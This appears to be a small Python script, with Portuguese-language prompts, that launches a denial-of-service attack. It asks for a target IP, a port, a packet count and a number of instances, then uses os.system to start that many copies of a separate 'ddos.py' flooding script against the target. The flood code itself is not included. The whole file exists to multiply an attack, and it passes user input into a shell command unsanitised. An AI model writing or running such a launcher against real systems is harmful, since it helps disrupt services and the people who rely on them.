import os
ip = str(input("[ip] ]===> "))
port = int(input("[porta] ]====> "))
t = int(input("[pac] ]====> "))
quan = int(input("}===> "))
for q in range(0,quan):
    os.system("start py ddos.py -i {} -p {} -t {}".format(ip,port,t))